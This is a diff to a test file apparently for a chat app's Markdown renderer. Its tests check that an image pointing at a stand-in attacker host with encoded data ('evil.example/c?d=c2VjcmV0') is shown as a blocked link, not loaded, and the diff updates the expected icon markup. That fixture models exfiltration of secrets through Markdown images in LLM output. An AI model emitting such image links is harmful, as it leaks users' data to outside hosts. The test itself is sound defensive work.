@@ -233,7 +233,11 @@ describe('images in LLM Markdown', () => {
     const html = render('요약 ![x](https://evil.example/c?d=c2VjcmV0) 끝');
     assert.doesNotMatch(html, /<img/);
     assert.doesNotMatch(html, /rel="preload"/);
-    assert.match(html, /<a href="https:\/\/evil.example\/c\?d=c2VjcmV0" class="md-blocked-image"[^>]*>🖼 x \(evil.example\)<\/a>/);
+    assert.match(html, /<a href="https:\/\/evil.example\/c\?d=c2VjcmV0" class="md-blocked-image"[^>]*>x \(evil.example\)<\/a>/);
+    // The app's component starts the link with an image icon (an SVG, not an emoji in the text).
+    const shown = renderComponent('요약 ![x](https://evil.example/c?d=c2VjcmV0) 끝');
+    assert.match(shown, /<a [^>]*class="md-blocked-image"[^>]*><svg [^>]*class="lucide lucide-image[^"]*"[^>]*>.*?<\/svg> x \(evil.example\)<\/a>/);
+    assert.doesNotMatch(renderComponent('[문서](https://example.com/doc)'), /<svg/, 'an ordinary link has no icon');
   });
 
   test('protocol-relative, other-path, relative and script sources are refused', () => {
